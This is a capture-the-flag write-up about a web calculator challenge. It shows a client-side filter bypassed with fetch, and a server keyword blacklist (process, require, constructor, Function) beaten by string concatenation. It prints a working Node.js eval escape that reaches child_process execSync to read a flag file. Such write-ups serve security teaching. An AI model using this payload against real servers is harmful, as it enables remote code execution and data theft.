
**Category:** Web Exploitation 

## Challenge Overview

We were presented with a web-based calculator. The interface allowed basic math operations, but attempting to use characters like quotes (`' "`) or brackets (`[] {}`) triggered a "Blocked characters detected!" alert.

## Analysis

### 1. Client-Side Analysis

Reviewing the frontend JavaScript (`script.js`), I noticed the security validation was entirely client-side:

JavaScript

```
const blocked = /['"\[\]\{\}]/;
if (blocked.test(expr)) {
  alert("Blocked characters detected!");
  return;
}
```

Since the validation occurs in the browser before the request is sent, it can be trivially bypassed by sending the HTTP request manually using the browser console.

### 2. Server-Side Analysis

After bypassing the frontend check using `fetch`, I attempted a standard Node.js Remote Code Execution (RCE) payload. However, the server responded with an error indicating a **Server-Side Blacklist**.

The server was inspecting the input string and blocking specific keywords, including:

- `process`
    
- `require`
    
- `constructor`
    
- `Function`
    
- `global`
    

This confirmed the backend was likely using `eval()` to process the input but was filtering "dangerous" words.

## Exploitation

### Bypassing the Blacklist

In JavaScript, `eval()` executes code passed as a string. We can bypass keyword filters by using **String Concatenation**. The server looks for the exact sequence `"require"`, but if we write `"req" + "uire"`, the filter sees harmless strings, while the executed code sees the command.

I constructed a payload to access the `child_process` module without using any blocked keywords contiguously.

**The Strategy:**

1. **Access Constructor:** `[]["fill"]["const"+"ructor"]`
    
2. **Get Process:** Create a function that returns `this.pro` + `cess`.
    
3. **Get Require:** Access `process["mainModule"]["req"+"uire"]`.
    
4. **Execute Command:** Import `child_process` and run `execSync`.
    

### The Final Payload

I used the browser console to send the following request, which concatenates the command `cat flag.txt` to read the flag file found during enumeration (`ls`):

JavaScript

```
const payload = `
  (
    []["fill"]["const"+"ructor"](
      "return this.pro"+"cess"
    )()
  )
  ["mainModule"]
  ["req"+"uire"]("chi"+"ld_pro"+"cess")
  ["ex"+"ecSync"]("cat fl"+"ag.txt").toString()
`;

fetch("/calculate", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ expr: payload }),
})
.then(res => res.json())
.then(json => console.log(json));
```

## Result

The server executed the code and returned the contents of `flag.txt`.

**Flag:**

Plaintext

```
nexus{7h1s_1s_no7_3v4l_Th1s_15_3v1lllllllllllllllllll}
```